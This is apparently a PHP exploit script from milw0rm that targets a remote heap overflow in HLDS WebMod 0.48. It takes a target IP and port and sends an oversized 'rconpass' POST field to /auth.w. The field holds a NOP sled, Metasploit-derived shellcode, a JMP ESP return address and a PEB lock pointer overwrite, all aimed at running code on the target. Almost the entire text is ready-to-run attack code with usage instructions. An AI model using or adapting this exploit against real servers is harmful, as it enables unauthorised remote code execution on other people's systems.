<?php
## HLDS WebMod 0.48  (rconpass) Remote Heap Overflow Exploit
## Tested on HLDS Launcher 4.1.1.1, WebMod 0.48, Windows XP SP2 Hebrew
## shir, skod.uk [at] gmail [dot] com
## 17/12/2007

## Registers (rconpass = "A"x16444):
# EAX 67E04955 w_mm.67E04955
# ECX 41414141
# EDX 41414141
# EBX 0000000A
# ESP 08F650FC
# EBP 08F726D4
# ESI 08F72734
# EDI 00000000
# EIP 67E0498C w_mm.67E0498C
#########


error_reporting(7);
ini_set("max_execution_time",0);

if($_SERVER['argv'][1] && $_SERVER['argv'][2]) {
	$host = $_SERVER['argv'][1];
	$port = $_SERVER['argv'][2];
} else {

	echo ("\r\nHLDS WebMod 0.48 Remote Heap Overflow Exploit\r\n");
	echo ("Written by shir, skod.uk\x40gmail\x2Ecom\r\n");
	echo ("Usage: php {$_SERVER['argv'][0]} IP PORT\r\n");
	echo ("Example: php {$_SERVER['argv'][0]} 192.168.0.100 27015\r\n");
	exit();
}

echo "[~] Packing...\r\n";


$scode = "\x66\x83\xC0\x04\xFF\xE0"; /*ADD EAX, 4 => JMP EAX*/

# win32_bind - Calc executer. Metasploit.com
$shellcode =
"\x33\xc9\x83\xe9\xde\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xf4".
"\x47\xba\xa4\x83\xeb\xfc\xe2\xf4\x08\xaf\xfe\xa4\xf4\x47\x31\xe1".
"\xc8\xcc\xc6\xa1\x8c\x46\x55\x2f\xbb\x5f\x31\xfb\xd4\x46\x51\xed".
"\x7f\x73\x31\xa5\x1a\x76\x7a\x3d\x58\xc3\x7a\xd0\xf3\x86\x70\xa9".
"\xf5\x85\x51\x50\xcf\x13\x9e\xa0\x81\xa2\x31\xfb\xd0\x46\x51\xc2".
"\x7f\x4b\xf1\x2f\xab\x5b\xbb\x4f\x7f\x5b\x31\xa5\x1f\xce\xe6\x80".
"\xf0\x84\x8b\x64\x90\xcc\xfa\x94\x71\x87\xc2\xa8\x7f\x07\xb6\x2f".
"\x84\x5b\x17\x2f\x9c\x4f\x51\xad\x7f\xc7\x0a\xa4\xf4\x47\x31\xcc".
"\xc8\x18\x8b\x52\x94\x11\x33\x5c\x77\x87\xc1\xf4\x9c\xb7\x30\xa0".
"\xab\x2f\x22\x5a\x7e\x49\xed\x5b\x13\x24\xdb\xc8\x97\x47\xba\xa4";

$evilcode = str_repeat("\x90", 100);
$evilcode.= $shellcode;
$evilcode.= str_repeat("\x90", 16156-(strlen($shellcode)));

$evilcode.= "\xFD\xAF\x6A\x07"; #076AAFFD   FFE4 => JMP ESP (cstrike\dlls\mp.dll)


$evilcode.= str_repeat("\x90", 60-(strlen($scode)));
$evilcode.= $scode;
$evilcode.= str_repeat("\x90", 8);
$evilcode.= str_repeat("0", 72);
$evilcode.= str_repeat("%00", 4);
$evilcode.= str_repeat("0", 4);
$evilcode.= "\x20\xF0\xFD\x7F"; #Windows PEB Lock Pointer
$evilcode.= str_repeat("%00", 8);

$post = "rconpass=" . $evilcode . "&setcookiesNULL=rconpass";

$pack = "POST /auth.w?redir= HTTP/1.1\r\n";
$pack.= "Host: {$host}:{$port}\r\n";
$pack.= "User-Agent: Mozilla/5.0\r\n";
$pack.= "Accept: */*\r\n";
$pack.= "Accept-Language: en-us,en;q=0.5\r\n";
$pack.= "Accept-Encoding: gzip,deflate\r\n";
$pack.= "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n";
$pack.= "Keep-Alive: 300\r\n";
$pack.= "Connection: keep-alive\r\n";
$pack.= "Content-Type: application/x-www-form-urlencoded\r\n";
$pack.= "Content-Length: ". strlen($post) ."\r\n\r\n" . $post;

echo "[~] Sending...\r\n";

$sock = @fsockopen($host, $port, $errno, $errstr, 10);
	if ($errstr)
		echo("[-] Can't connect {$host}:{$port}\r\n");
	else {
			fputs($sock, $pack);
			$tmp = fgets($sock,1024);
				if(strstr($tmp, '<'))
					echo "[-] Failed, you better try again.\r\n";
				else
					echo "[+] Shellcode should be executed.\r\n";
			fclose($sock);
		}
?> 

# milw0rm.com [2008-05-03]
